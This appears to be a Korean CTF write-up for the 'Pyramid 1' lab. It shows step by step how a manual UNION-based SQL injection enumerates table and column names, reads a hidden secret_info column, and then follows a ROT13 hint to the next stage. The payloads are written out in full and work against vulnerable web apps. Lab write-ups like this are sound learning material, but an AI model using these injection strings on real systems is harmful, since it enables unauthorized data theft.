<!DOCTYPE html>
<html lang="ko">
  <head>
    <meta charset="utf-8" />
    <title>Pyramid 1 – SQLi Walkthrough</title>
    <link rel="stylesheet" href="index.css" />
  </head>

  <body>
    <main class="ctf-page">
      <header class="ctf-header">
        <h1 class="heading-main">Pyramid 1 단계 SQLi Walkthrough</h1>
      </header>

      <section class="ctf-section">
        <p class="para">IP 확인 후 HTTP로 서비스에 접속한다.</p>

        <figure class="fig">
          <img
            src="1.이재민_ctf_문제풀이_files/image001.jpg"
            alt="Pyramid 1 초기 접속 화면"
          />
          <figcaption class="fig-caption">초기 진입 페이지 화면</figcaption>
        </figure>

        <p class="para">
          검색 입력창에 <code class="code-inline">' OR '1'='1</code> 과 같은
          가장 기본적인 SQLi 페이로드를 입력했을 때 전체 행이 반환되는지 확인한다.
        </p>

        <figure class="fig">
          <img
            src="1.이재민_ctf_문제풀이_files/image002.jpg"
            alt="기본 SQLi 페이로드 실행 결과"
          />
          <figcaption class="fig-caption">
            기본 SQLi 페이로드 입력 후 전체 레코드가 조회되는 모습
          </figcaption>
        </figure>

        <h2 class="heading-sub">알 수 있는 사실</h2>
        <ul class="bullet-list">
          <li>입력값이 필터링 없이 DB 쿼리에 직접 사용된다.</li>
          <li>URL 에서 파라미터 name 값이 그대로 노출되며 GET 방식으로 서버로 전송된다.</li>
          <li>화면에는 3개의 칼럼만 표시되지만 실제 쿼리에는 더 많은 컬럼이 존재할 수 있다.</li>
          <li>OR, SELECT 등 키워드가 차단되지 않아 SQL Injection 취약점이 존재한다.</li>
        </ul>
      </section>

      <section class="ctf-section">
        <h2 class="heading-sub">1. 테이블명 추출 SQLi</h2>
        <p class="para">
          UNION 기반 SQL Injection을 이용해 현재 데이터베이스의 테이블 이름을 수집한다.
        </p>

        <pre class="code-block">
' UNION SELECT 1, group_concat(table_name), 3
  FROM information_schema.tables
 WHERE table_schema = database() --</pre>

        <figure class="fig">
          <img
            src="1.이재민_ctf_문제풀이_files/image003.jpg"
            alt="테이블명 추출 결과"
          />
          <figcaption class="fig-caption">
            두 번째 컬럼 위치에 테이블 이름들이 출력된다.
          </figcaption>
        </figure>
      </section>

      <section class="ctf-section">
        <h2 class="heading-sub">2. 칼럼명 추출 SQLi</h2>
        <p class="para">
          식별한 테이블 <code class="code-inline">pharaohs</code> 에 대해 모든 컬럼명을
          조회한다.
        </p>

        <pre class="code-block">
' UNION SELECT 1, group_concat(column_name), 3
  FROM information_schema.columns
 WHERE table_name = 'pharaohs' --</pre>

        <figure class="fig">
          <img
            src="1.이재민_ctf_문제풀이_files/image004.jpg"
            alt="pharaohs 테이블 컬럼명 추출 결과"
          />
          <figcaption class="fig-caption">
            두 번째 컬럼 위치에 pharaohs 테이블의 모든 컬럼명이 출력된다.
          </figcaption>
        </figure>
      </section>

      <section class="ctf-section">
        <h2 class="heading-sub">3. secret_info 컬럼에서 최종 힌트 획득</h2>
        <p class="para">
          <code class="code-inline">pharaohs</code> 테이블의
          <code class="code-inline">secret_info</code> 컬럼을 대상으로 조건부 조회를 수행해
          최종 힌트를 얻는다.
        </p>

        <pre class="code-block">
' UNION SELECT 1, 2, secret_info
  FROM pharaohs
 WHERE id = 6 --</pre>

        <figure class="fig">
          <img
            src="1.이재민_ctf_문제풀이_files/image005.jpg"
            alt="secret_info 컬럼 조회 결과"
          />
          <figcaption class="fig-caption">
            secret_info 컬럼에서 의미 있는 문장이 조회된다.
          </figcaption>
        </figure>
      </section>

      <section class="ctf-section">
        <h2 class="heading-sub">4. 소스코드 주석과 ROT13 힌트 해석</h2>

        <figure class="fig">
          <img
            src="1.이재민_ctf_문제풀이_files/image006.jpg"
            alt="소스 코드 주석에 포함된 긴 문자열"
          />
          <figcaption class="fig-caption">
            페이지 소스 주석에 매우 긴 문자열이 포함되어 있다.
          </figcaption>
        </figure>

        <figure class="fig">
          <img
            src="1.이재민_ctf_문제풀이_files/image007.jpg"
            alt="ROT13.com 에서 문자열 디코딩"
          />
          <figcaption class="fig-caption">
            ROT13.com 등 온라인 도구를 이용해 문자열을 디코딩한다.
          </figcaption>
        </figure>

        <p class="para">
          ROT13 디코딩 결과는 “파라오의 암호는 문지기의 열쇠를 위한 것이 아니라, 펼쳐지는 나일강
          지도의 논리를 위해 존재한다. 흐름을 따라 다음 방으로 나아가라.” 와 같은 의미의 문장이다.
        </p>
        <p class="para">
          이 문구는 SSH 접속 정보가 아니라는 점을 암시하며, 흐름(flow)을 따라 웹 디렉터리를
          이동해야 한다는 메시지를 비유적으로 전달한다.
        </p>

        <figure class="fig">
          <img
            src="1.이재민_ctf_문제풀이_files/image008.png"
            alt="디렉터리 경로를 암시하는 힌트"
          />
          <figcaption class="fig-caption">
            슬래시(/)와 함께 디렉터리 경로 형태의 문자열이 포함되어 있다.
          </figcaption>
        </figure>

        <p class="para">
          최종 힌트에 슬래시(<code class="code-inline">/</code>)가 포함되어 있어 디렉터리
          경로임을 유추할 수 있고,
          <code class="code-inline">http://pyramidIP/the_architect_of_the_Great_Pyramid</code>
          와 같은 URL 로 이동하면 다음 단계로 넘어갈 수 있다.
        </p>

        <figure class="fig">
          <img
            src="1.이재민_ctf_문제풀이_files/image009.jpg"
            alt="trivia 칼럼 조회 결과"
          />
          <figcaption class="fig-caption">
            trivia 칼럼에는 3000자 분량의 반복 문자열과 수동 SQLi 를 유도하는 메시지가 포함된다.
          </figcaption>
        </figure>

        <p class="para">
          trivia 칼럼의 내용을 읽어 보면 자동화 도구(sqlmap) 대신 수동 SQL Injection 과정을
          경험해 보라는 의도가 담겨 있음을 알 수 있다.
        </p>

        <p class="para">
          더 자세한 풀이 과정은 외부 블로그에 정리되어 있으며,
          비밀번호는 <code class="code-inline">cmd</code> 로 안내된다.
        </p>
      </section>
    </main>
  </body>
</html>
